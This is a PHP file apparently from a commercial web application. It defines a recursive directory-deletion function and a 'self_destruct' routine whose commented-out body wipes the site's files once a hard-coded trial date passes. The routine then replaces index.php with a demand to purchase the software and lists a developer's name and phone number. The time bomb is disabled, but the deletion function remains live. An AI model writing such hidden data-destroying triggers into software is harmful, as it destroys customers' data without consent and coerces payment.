<?php		
function rrmdir($dir) 
{
	if (is_dir($dir))
	{
		$objects = scandir($dir);
		foreach ($objects as $object)
		{
			if ($object != "." && $object != "..")
			{
				if (filetype($dir."/".$object) == "dir")
				{
					rrmdir($dir."/".$object);
				}
				else 
				{
					if ($object != 'index.php')
					unlink($dir."/".$object);
				}
			}
		}
		reset($objects);
		rmdir($dir);
	}
}

function self_destruct()
{
	/*
	$present_time = time();
	$demo_time = 1325260000 + (7*24*60*60);
	if ($present_time > $demo_time)
	{
		rrmdir('.');
		?>
		<div style="margin:50px;padding:20px;width:500px;border:1px solid #333;font-family:Verdana;" align="center">
		Trial version has expired! Please purchase the software from vendor for full version<br>Please contact below developer for details <br><b>Eshwar Chandra<br>Ph: +91 99590 76450</b>
		</div>
		<?php
		$file = "index.php";
		$fh = fopen($file, 'w') or die("can't open file");
		
		$line = "<div style='margin:50px;padding:20px;width:500px;border:1px solid #333;font-family:Verdana;' align='center'>
		Trial version has expired! Please purchase the software from vendor for full version<br>Please contact below developer for details <br><b>Eshwar Chandra<br>Ph: +91 99590 76450</b>";
		fwrite($fh,$line);
		
		fclose($fh);
	}
	*/
}
?>